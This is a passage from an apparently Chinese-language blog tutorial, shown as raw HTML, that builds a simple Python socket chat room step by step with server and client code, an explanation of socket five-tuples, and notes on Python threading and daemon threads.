comment">##第一步：创建嵌套字，绑定套接字到本地IP与端口</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#绑定端口号</span><span class="token comment">#bind():绑定地址（host,port）到套接字,在AF_INET下,以元组（host,port）的形式表示地址</span><span class="token comment">##第二步：监听连接</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#开始监听;最大连接1台客户端，超过后排队</span><span class="token comment">##第三步：进入循环，不断接受客户端的连接请求</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span>addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建客户端连接</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"连接地址：%s"</span><span class="token operator">%</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">##第四步：接收传来的数据/发送给对方数据</span>    msg <span class="token operator">=</span> <span class="token string">'Hello!'</span>    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">##第五步：传输完毕后，关闭套接字</span>    client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>为什么多个客户端可以连接服务器的同个端口？</strong></p><p>我们这里讲Socket连接：<br>1.端口只是一个数字辨识，不是真正的物理端口；<br>2.一个Socket连接的<a href="https://so.csdn.net/so/search?q=%E4%B8%BB%E9%94%AE&spm=1001.2101.3001.7020">主键</a>（即不同socket之间的区分）是由一个五元组{SRC-IP, SRC-PORT, DEST-IP, DEST-PORT, PROTOCOL}组成，即{源地址，源端口，目标地址，目标端口，协议}组成，那些说四元组不包含协议的说法是错误的。<br>3.一个进程可以拥有多个socket连接。</p><p>例子一、两个客户端连接在同个服务器的同个端口80，即有两个socket连接：<br>- socket1 {SRC-A, 100, DEST-X,80, TCP}<br>- socket2{SRC-B, 100, DEST-X,80, TCP}<br>主机A和主机B的地址不同，两台主机同时连接到服务器X的80端口。服务器要怎么处理这个连接是它的事，我们要理解的是为什么一个主机同个端口能监听多个客户端Socket连接。</p><p>解释：<br>1.是因为两个客户端的IP不同，服务器能识别出不同的Socket；<br>2.即使IP地址相同，端口不同，服务器也能够分辨；<br>3.只要服务器知道收到的请求和哪个socket相关，那么它就能使用这个socket正确地回复那个客户端；<br>4.如果对于不同的socket需要不同的端口，那么不仅仅浪费服务器资源，而且每次客户端连接上serverSocket之后还要另外分配新的端口和客户端通信。没必要。</p><p>例子二、不同的进程可以监听同一个端口。</p><ol><li>因此在服务器的两个使用不同协议的进程可以监听同一个端口。</li><li>如果一个socket的辨识只是四元组不包括协议{SRC-IP, SRC-PORT, DEST-IP, DEST-PORT}，那么不同进程是不可能同时监听同一个端口的。没有协议的话一个客户端连接到同一台某个有两个进程监听端口的服务器，那么就没有什么机制可以确定客户端是要连接哪一个进程了。</li></ol><p>总结：</p><ol><li>不同协议可以监听同一个端口（不管是不是在服务器的同个进程）</li><li>某个协议的进程可以监听多个客户端的连接，因为只要五元组不同进程就能分辨。</li><li>从上面的例子可以知道，客户端同个进程也可以在同个端口用不同的协议与客户端建立连接。</li></ol></blockquote><p><a href="https://www.jianshu.com/p/066d99da7cbd">一、Socket技术详解 - 简书 (jianshu.com)</a></p><h3 id="代码0-2"><a href="#代码0-2" class="headerlink" title="代码0.2"></a><strong>代码0.2</strong></h3><p><strong>作用：在0.1基础上，实现服务器接收数据，客户端发送数据</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务端</span><span class="token keyword">import</span> sockethost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取本地主机名</span>port <span class="token operator">=</span> <span class="token number">9999</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token comment">##第一步：创建嵌套字，绑定套接字到本地IP与端口</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#绑定端口号</span><span class="token comment">#bind():绑定地址（host,port）到套接字,在AF_INET下,以元组（host,port）的形式表示地址</span><span class="token comment">##第二步：监听连接</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#开始监听;最大连接1台客户端，超过后排队</span><span class="token comment">##第三步：进入循环，不断接受客户端的连接请求</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span>addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建客户端连接</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"连接地址：%s"</span><span class="token operator">%</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">##第四步：接收传来的数据和转发对方数据</span>    msg <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token comment">#接收小于1024字节的数据</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">##第五步：传输完毕后，关闭套接字</span>    client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#客户端</span><span class="token keyword">import</span> sockethost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取本地主机名</span><span class="token comment">#host = socket.gethostbyname(socket.gethostname())</span><span class="token comment">#host = '39.144.108.89'</span>port <span class="token operator">=</span> <span class="token number">9999</span> <span class="token comment">#设置端口</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token comment">##第一步：创建嵌套字，连接远端地址</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#连接服务端，指定主机和端口</span><span class="token comment">##第二步：连接后发送数据/接收数据</span>msg <span class="token operator">=</span> <span class="token string">'Hello!'</span>client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">##第三步：传输完毕，关闭嵌套字</span>client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码0-3"><a href="#代码0-3" class="headerlink" title="代码0.3"></a><strong>代码0.3</strong></h3><p><strong>作用：在0.2基础上，实现可传可接收，但存在问题，未解决</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务端</span><span class="token keyword">import</span> sockethost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取本地主机名</span><span class="token comment">#host = '192.168.120.29' #服务端IP地址</span>port <span class="token operator">=</span> <span class="token number">8800</span>max_connect <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">#最大连接客户端数</span>max_receive_data <span class="token operator">=</span> <span class="token number">1024</span> <span class="token comment">#最大接收字节数</span>server_name <span class="token operator">=</span> <span class="token string">'老王'</span> <span class="token comment">#设置用户名</span><span class="token comment">##第一步：创建嵌套字，绑定套接字到本地IP与端口</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#绑定端口号</span><span class="token comment">##第二步：监听连接</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span>max_connect<span class="token punctuation">)</span> <span class="token comment">#开始监听;最大连接1台客户端，超过后排队</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Server is ready.'</span><span class="token punctuation">)</span><span class="token comment">##第三步：进入循环，不断接受客户端的连接请求</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span>addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建客户端连接</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"连接地址：%s"</span><span class="token operator">%</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">##第四步：接收传来的数据/发送给对方数据</span>    <span class="token comment">#发送数据</span>    send_msg <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入：'</span><span class="token punctuation">)</span>    send_msg <span class="token operator">=</span> server_name <span class="token operator">+</span> <span class="token string">': '</span><span class="token operator">+</span> send_msg    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>send_msg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> send_msg <span class="token operator">==</span> <span class="token string">'close'</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token comment">#接收数据</span>    receive_msg <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>max_receive_data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>receive_msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">##第五步：传输完毕后，关闭套接字</span>client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#客户端</span><span class="token keyword">import</span> sockethost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取本地主机名</span><span class="token comment">#host = '192.168.31.129' #服务端IP地址</span>port <span class="token operator">=</span> <span class="token number">8800</span> <span class="token comment">#设置端口</span>max_receive_data <span class="token operator">=</span> <span class="token number">1024</span> <span class="token comment">#最大接收字节数</span>client_name <span class="token operator">=</span> <span class="token string">'老刘'</span> <span class="token comment">#设置用户名</span><span class="token comment">##第一步：创建嵌套字，连接远端地址</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#连接服务端，指定主机和端口</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!'</span><span class="token punctuation">)</span><span class="token comment">##第二步：连接后发送数据/接收数据</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment">#接收数据</span>    receive_msg <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>max_receive_data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>receive_msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> receive_msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'close'</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token comment">#发送数据</span>    send_msg <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入：'</span><span class="token punctuation">)</span>    send_msg <span class="token operator">=</span> client_name <span class="token operator">+</span> <span class="token string">': '</span><span class="token operator">+</span> send_msg    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>send_msg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">##第三步：传输完毕，关闭嵌套字</span>client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="初级阶段2：hreading使用"><a href="#初级阶段2：hreading使用" class="headerlink" title="初级阶段2：hreading使用"></a>初级阶段2：hreading使用</h2><pre class="line-numbers language-none"><code class="language-none">服务器端的套接字起到监听的作用（类似电话主机），每连接成功一个客户端，就返回一个和客户端通信的套接字（类似电话的分机），服务器端用每个“分机”和每个客户端进行通信。因为我们使用的是默认的阻塞套接字，服务器和每个客户端通信的过程都是阻塞的，所以，为了服务器可以“同时”（并发）和客户端进行通信，我们用到了多线程。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>hreading(多线程)模块中包含了关于线程操作的丰富功能，包括：常用线程函数，线程对象，锁对象，递归锁对象，事件对象，条件变量对象，信号量对象，定时器对象，栅栏对象。</p><p>创建 Thread 对象有 2 种手段：</p><p>1.直接创建 Thread ，将一个 callable 对象从类的构造器传递进去，这个 callable 就是回调函数，用来处理任务。<br>2.<strong>编写一个自定义类继承 Thread，然后复写 run() 方法，在 run() 方法中编写任务处理代码，然后创建这个 Thread 的子类。</strong></p><p><a href="https://blog.csdn.net/briblue/article/details/85101144">(29条消息) Python多线程编程(一）：threading 模块 Thread 类的用法详解_frank909的博客-CSDN博客_python threading</a></p></blockquote><blockquote><p>Python 将一个列表里面的元素拼接成一个字符串:</p><p>注意: 1. 列表里面的元素必须全是字符串才可以使用join()进行拼接</p><p>　　 2. 返回的是一个字符串</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">item1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"lowman"</span><span class="token punctuation">,</span> <span class="token string">"isbusy"</span><span class="token punctuation">]</span>item2 <span class="token operator">=</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>item1<span class="token punctuation">)</span> <span class="token comment"># 根据实际需要使用相应的分隔符连接列表元素,如 , : ; 或者空字符串</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><blockquote><p>Thread.setDaemon(false)设置为用户线程；通过Thread.setDaemon(true)设置为守护线程。如果不设置次属性，默认为用户线程。</p><p>用户线程和守护线程的区别：</p><p>1.主线程结束后用户线程还会继续运行,JVM存活；主线程结束后守护线程和JVM的状态又下面第2条确定。</p><p>2.如果没有用户线程，都是守护线程，那么JVM结束（随之而来的是所有的一切烟消云散，包括所有的守护线程）。</p><p><a href="https://blog.csdn.net/xyls12345/article/details/26256693">(29条消息) Thread.setDaemon详解_starfe-geek的博客-CSDN博客_thread.setdeamon</a></p></blockquote><table><thead><tr><th>Threading模块的对象</th><th>描述</th></tr></thead><tbody><tr><td>Thread</td><td>线程对象</td></tr></tbody></table><table><thead><tr><th>Threading模块的<a href="https://so.csdn.net/so/search?q=Thread%E7%B1%BB&spm=1001.2101.3001.7020">Thread类</a></th><th>描述</th></tr></thead><tbody><tr><td>name</td><td>线程名（属性）</td></tr><tr><td>ident</td><td>线程标识符（属性）</td></tr><tr><td>daemon</td><td>线程是否是守护线程（属性）</td></tr><tr><td><em>init</em>(group=None, tatget=None, name=None, args=(),kwargs ={}, verbose=None, daemon=None)</td><td>实例化一个线程对象，需要有一个可调用的 target，以及其参数 args或 kwargs。还可以传递 name 或 group 参数，不过后者还未实现。此外， verbose 标 志 也 是 可 接 受 的。 而 daemon 的 值 将 会 设定thread.daemon 属性/标志</td></tr><tr><td>start()</td><td>开启线程</td></tr><tr><td>run()</td><td>定义线程功能的方法（通常在子类中被应用开发者重写）</td></tr></tbody></table><p><a href="https://blog.csdn.net/wqx521/article/details/82754617">(29条消息) Python3——多线程之threading模块_a1314521531的博客-CSDN博客_python3 threading</a></p><blockquote><p><a href="https://www.cnblogs.com/klchang/p/4635040.html">Python中获取异常（Exception）信息</a></p><p>repr(e)</p><p>给出较全的异常信息，包括异常信息的类型，如1/0的异常信息</p><p>“ZeroDivisionError(‘integer division or modulo by zero’,)”</p></blockquote><h3 id="代码0-4"><a href="#代码0-4" class="headerlink" title="代码0.4"></a><strong>代码0.4</strong></h3><p><strong>作用：在0.3基础上实现多客户端交流，但发送数据和接收数据（显示）安排不合理</strong></p><p><a href="https://blog.csdn.net/wyn1564464568/article/details/122891038">(29条消息) python实现简易聊天室程序_Castria的博客-CSDN博客_python聊天室项目代码</a></p><blockquote><p>首先服务器端创建ServerSocket对象，等待客户连接。</p><p>每当有一个客户连接上时，使用一个线程保存其Socket，把该线程保存在一个HashMap集合中。</p><p>客户端有信息发送给服务器时，服务器先获取要接收者用户名，根据用户名获取保存的线程（如果没有找到该线程则回发给发送者消息提示其需要联系的用户未上线），再根据该线程创建输出流，把消息转发给接收者。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务器</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threadinghost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 获取本地主机名</span>port <span class="token operator">=</span> <span class="token number">9999</span>  <span class="token comment"># 设置端口</span>max_connect <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment"># 设置最大连接客户端数</span>max_recedata <span class="token operator">=</span> <span class="token number">1024</span>  <span class="token comment"># 设置最大接收字节数</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>  <span class="token comment"># 创建socket对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 绑定端口号</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span>max_connect<span class="token punctuation">)</span>  <span class="token comment"># 开始监听;最大连接2台客户端，超过后排队</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ServerSocket is ready.'</span><span class="token punctuation">)</span>cnt <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 当前在线人数</span>textList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储历史记录</span>socketList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储已有客户端（套接字）</span><span class="token comment"># 自定义类继承，重写run()方法</span><span class="token keyword">class</span> <span class="token class-name">ThreadCreate</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> client<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 线程初始化</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>  <span class="token comment"># 当作Thread的固定结构吧……</span>        self<span class="token punctuation">.</span>client <span class="token operator">=</span> client  <span class="token comment"># 保存嵌套字（客户端）</span>        socketList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>client<span class="token punctuation">)</span>  <span class="token comment"># 把嵌套字存在列表里</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">global</span> cnt            <span class="token keyword">for</span> sock <span class="token keyword">in</span> socketList<span class="token punctuation">:</span>                <span class="token keyword">if</span> sock <span class="token operator">==</span> self<span class="token punctuation">.</span>client<span class="token punctuation">:</span>                    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Old client.There are %d presons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'New Client is Coming.There are %d presons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                word <span class="token operator">=</span> self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>max_recedata<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#接收数据</span>                textList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token comment">#生成历史记录</span>                <span class="token keyword">for</span> sock <span class="token keyword">in</span> socketList<span class="token punctuation">:</span> <span class="token comment">#给所有客户端发送新消息</span>                    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token operator">+</span>word<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span> <span class="token comment">#客户端强制断开连接（关闭窗口）</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#如何加一个时间戳？</span>            cnt <span class="token operator">=</span> cnt<span class="token operator">-</span><span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Lose one person.There are %d persons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span>            socketList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>self<span class="token punctuation">.</span>client<span class="token punctuation">)</span> <span class="token comment">#移除该客户端</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> socketList<span class="token punctuation">:</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Lose one person.There are %d persons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建客户端连接，每次接收一个连接</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"连接地址：%s"</span> <span class="token operator">%</span> <span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># 关于历史记录的处理</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>textList<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'No message.'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>textList<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># 来了一个人加一</span>        <span class="token comment"># 给用户创建新进程</span>        newThread <span class="token operator">=</span> ThreadCreate<span class="token punctuation">(</span>client<span class="token punctuation">)</span>        newThread<span class="token punctuation">.</span>setDaemon<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># 设置为守护线程</span>        newThread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 开启线程</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!The number of people is '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># finally:</span>    <span class="token comment">#     client.close()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#客户端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threadingserver_host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token 